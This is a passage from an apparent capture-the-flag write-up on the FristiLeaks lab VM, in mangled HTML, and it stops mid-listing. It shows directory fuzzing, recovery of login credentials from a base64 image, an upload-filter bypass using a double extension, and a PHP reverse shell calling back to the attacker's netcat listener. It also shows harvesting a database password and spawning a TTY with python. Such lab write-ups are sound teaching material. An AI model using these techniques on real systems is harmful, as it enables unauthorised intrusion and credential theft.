-</span><span class='line'>Sander2121
-</span><span class='line'>Reinierk
-</span><span class='line'>DearCharles
-</span><span class='line'>miamat
-</span><span class='line'>MisterXE
-</span><span class='line'>BasB
-</span><span class='line'>Dwight
-</span><span class='line'>Egeltje
-</span><span class='line'>pdersjant
-</span><span class='line'>tcp130x10
-</span><span class='line'>spierenburg
-</span><span class='line'>ielmatani
-</span><span class='line'>renepieters
-</span><span class='line'>Mystery
-</span><span class='line'>guest
-</span><span class='line'>uinix
-</span><span class='line'>WhatSecurity
-</span><span class='line'>mramsmeets
-</span><span class='line'>fristi
-</span><span class='line'>drink
-</span><span class='line'>keep
-</span><span class='line'>calm
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Then I use <code>wfuzz</code> to discover any possible hidden path.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# wfuzz -c -z file,cewl_dict_list.txt <span class="p">&amp;</span>ndash<span class="p">;</span>hc <span class="m">404</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.150/FUZZ&quot;</span>&gt;http://10.1.1.150/FUZZ&lt;/a&gt;&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;hr /&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;ul&gt;
-</span><span class='line'>&lt;li&gt;Wfuzz  2.0 - The Web Bruteforcer                     *&lt;/li&gt;
-</span><span class='line'>&lt;/ul&gt;
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>&lt;hr /&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Target: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.150/FUZZ&quot;</span>&gt;http://10.1.1.150/FUZZ&lt;/a&gt;
-</span><span class='line'>Payload <span class="nb">type</span>: file,cewl.txt&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h1&gt;Total requests: 54&lt;/h1&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h1&gt;ID  Response   Lines      Word         Chars          Request    &lt;/h1&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;00051:  <span class="nv">C</span><span class="o">=</span><span class="m">301</span>      <span class="m">7</span> L        <span class="m">20</span> W      <span class="m">233</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span> - fristi<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;root@kali:~/fristileaks#
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>From the result, there is one folder found <code>fristi</code>.</p>
-
-<p>By visiting the new found path <code>http://10.1.1.150/fristi/</code>, a login page appeared in my firefox.</p>
-
-<p><img class="left" src="/downloads/fristileaks/2.png"></p>
-
-<p>After tried some weak passwords but all failed, I found some clues in the source code.</p>
-
-<p>First thing is that there is a comment written by <code>eezeepz</code>, in the top of the code:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
-</span><span class='line'><span class="nt">&lt;head&gt;</span>
-</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;description&quot;</span> <span class="na">content=</span><span class="s">&quot;super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.&quot;</span><span class="nt">&gt;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="c">&lt;!--</span>
-</span><span class='line'><span class="c">TODO:</span>
-</span><span class='line'><span class="c">We need to clean this up for production. I left some junk in here to make testing easier. </span>
-</span><span class='line'>
-</span><span class='line'><span class="c">- by eezeepz</span>
-</span><span class='line'><span class="c">--&gt;</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="nt">&lt;p&gt;&lt;/head&gt;</span>
-</span><span class='line'><span class="nt">&lt;body&gt;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nt">&lt;center&gt;</span>
-</span><span class='line'><span class="nt">&lt;h1&gt;</span> Welcome to #fristileaks admin portal<span class="nt">&lt;/h1&gt;</span>
-</span><span class='line'><span class="nt">&lt;/center&gt;</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="nt">&lt;p&gt;</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>and another comment, which is a base64 encoded string, has been inserted at the very bottom of the source code:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="c">&lt;!--</span>
-</span><span class='line'><span class="c">iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU 12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5 uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1 04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws 30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl 3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34 rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR U5ErkJggg==</span>
-</span><span class='line'><span class="c">--&gt;</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="nt">&lt;p&gt;</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p><font color="red">[note!!]</font> before decoding, we have to remove newlines from each line, <code>tr</code> can be used to fix that:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# cat test.txt&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
-</span><span class='line'>jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
-</span><span class='line'>S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
-</span><span class='line'>B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
-</span><span class='line'>m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
-</span><span class='line'>Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
-</span><span class='line'>DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
-</span><span class='line'>jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
-</span><span class='line'>12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
-</span><span class='line'>uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
-</span><span class='line'>04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
-</span><span class='line'>i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
-</span><span class='line'>tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
-</span><span class='line'>30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
-</span><span class='line'>3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
-</span><span class='line'>ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
-</span><span class='line'>mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
-</span><span class='line'>rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
-</span><span class='line'>EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
-</span><span class='line'>AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
-</span><span class='line'>CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
-</span><span class='line'><span class="nv">U5ErkJggg</span><span class="o">==</span>
-</span><span class='line'>root@kali:~/fristileaks# tr -d <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\n</span><span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span> test.txt &gt; base64_decoded.txt
-</span><span class='line'>root@kali:~/fristileaks# cat base64_decoded.txt
-</span><span class='line'>iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg<span class="o">==</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>After decoded this, I got a PNG file:</p>
-
-<p><img class="left" src="/downloads/fristileaks/3.png"></p>
-
-<p>In terms of all the information we collected from this page/source code, I can guess the username is <font color="red"><code>eezeepz</code></font> and the password is <font color="red"><code>keKkeKKeKKeKkEkkEk</code></font>.</p>
-
-<p>After login, I got a link to allow us upload file!</p>
-
-<p><img class="left" src="/downloads/fristileaks/4.png"></p>
-
-<p>But when I trying to upload <code>.php</code> webshell, I got the following error, only <code>png</code>, <code>jpg</code> and <code>gif</code> are allowed.</p>
-
-<p><img class="left" src="/downloads/fristileaks/5.png"></p>
-
-<p>In order to bypass the whitelist verification, I added <code>.jpg</code> at the end of the web shell&rsquo;s file name to make it looks like <code>rsh.php.jpg</code>.</p>
-
-<p><img class="left" src="/downloads/fristileaks/6.png"></p>
-
-<p><code>rsh.php</code> is a reverse PHP shell which will connect back to my Kali&rsquo;s tcp port <code>5555</code>, so before I upload and trigger the shell, I setup <code>nc</code> to listen on port <code>5555</code>.</p>
-
-<p>Ok, after uploaded the reverse PHP shell, I can now visit it from uploads folder, the url is <code>http://10.1.1.150/fristi/uploads/rsh.php.jpg</code>.</p>
-
-<p><img class="left" src="/downloads/fristileaks/7.png"></p>
-
-<p>Bingo! I got a shell now.</p>
-
-<p>After enumeration I found Database sensitive information stored in the file <code>/var/www/html/fristi/checklogin.php</code>, user name <font color="red"><code>eezeepz</code></font> and the password is <font color="red"><code>4ll3maal12#</code></font></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">\</span><span class="o">?</span><span class="nx">php</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nb">ob_start</span><span class="p">();</span>
-</span><span class='line'><span class="nv">$host</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">localhost</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span> <span class="c1">// Host name</span>
-</span><span class='line'><span class="nv">$username</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">eezeepz</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span> <span class="c1">// Mysql username</span>
-</span><span class='line'><span class="nv">$password</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="mi">4</span><span class="nx">ll3maal12</span><span class="c1">#&amp;rdquo;; // Mysql password</span>
-</span><span class='line'><span class="nv">$db_name</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">hackmenow</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span> <span class="c1">// Database name</span>
-</span><span class='line'><span class="nv">$tbl_name</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">members</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span> <span class="c1">// Table name&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Connect</span> <span class="nx">to</span> <span class="nx">server</span> <span class="k">and</span> <span class="nx">select</span> <span class="nx">databse</span><span class="o">.</span>
-</span><span class='line'><span class="nb">mysql_connect</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nv">$host</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nv">$username</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nv">$password</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">cannot</span> <span class="nx">connect</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="nb">mysql_select_db</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nv">$db_name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">cannot</span> <span class="nx">select</span> <span class="nx">DB</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Define</span> <span class="nv">$myusername</span> <span class="k">and</span> <span class="nv">$mypassword</span>
-</span><span class='line'><span class="nv">$myusername</span><span class="o">=</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">myusername</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;];</span>
-</span><span class='line'><span class="nv">$mypassword</span><span class="o">=</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">mypassword</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;];</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="nx">turncate</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>The first thing I thought was to login via SSH with the found username and password, but SSH is not running on the target server.</p>
-
-<p>Then, I tried <code>su</code> command but it has too be called from a TTY session. by using the trick <font color="red"><code>python -c "import pty; pty.spawn('/bin/bash');"</code></font> to jail break, I can try <code>su</code> again with the login credential. But still failed, Damn, the password is wrong.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span>python -c <span class="p">&amp;</span>ldquo<span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rdquo<span class="p">;</span>
-</span><span class='line'>python -c <span class="p">&amp;</span>ldquo<span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rdquo<span class="p">;</span>
-</span><span class='line'>bash-4.1<span class="nv">$ </span>su eezeepz
-</span><span class='line'>su eezeepz
-</span><span class='line'>Password: 4ll3maal12#&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;idsu: incorrect password
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>So I have to keep digging further, then I found a clue file <code>notes.txt</code> under the path <code>/var/www/</code>.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span><span class="nb">pwd</span>
-</span><span class='line'>/var/www
-</span><span class='line'><span class="nb">pwd</span>
-</span><span class='line'>sh-4.1<span class="nv">$ </span>ls -al
-</span><span class='line'>ls -al
-</span><span class='line'>total 28
-</span><span class='line'>drwxr-xr-x.  <span class="m">6</span> root root <span class="m">4096</span> Nov <span class="m">17</span> 13:50 .
-</span><span class='line'>drwxr-xr-x. <span class="m">19</span> root root <span class="m">4096</span> Nov <span class="m">19</span> 01:41 ..
-</span><span class='line'>drwxr-xr-x.  <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">24</span> 13:53 cgi-bin
-</span><span class='line'>drwxr-xr-x.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">17</span> 03:29 error
-</span><span class='line'>drwxr-xr-x.  <span class="m">7</span> root root <span class="m">4096</span> Nov <span class="m">25</span> 04:10 html
-</span><span class='line'>drwxr-xr-x.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">17</span> 03:37 icons
-</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>   <span class="m">1</span> root root   <span class="m">98</span> Nov <span class="m">17</span> 13:50 notes.txt
-</span><span class='line'>sh-4.1<span class="nv">$ </span>cat notes.txt
-</span><span class='line'>cat notes.txt
-</span><span class='line'>hey eezeepz your homedir is a mess, go clean it up, just dont delete
-</span><span class='line'>the important stuff.&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;-jerry
-</span><span class='line'>sh-4.1<span class="err">$</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>In that file, jerry mentioned home directory about user <code>eezeepz</code>. by following this clue, I checked <code>/home</code> directory:</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='html'><span class='line'>sh-4.1$ cd /home
-</span><span class='line'>cd /home
-</span><span class='line'>sh-4.1$ ls -al
-</span><span class='line'>ls -al
-</span><span class='line'>total 28
-</span><span class='line'>drwxr-xr-x.  5 root      root       4096 Nov 19 01:40 .
-</span><span class='line'>dr-xr-xr-x. 22 root      root       4096 Dec 27 17:50 ..
-</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span>.  2 admin     admin      4096 Nov 19 02:03 admin
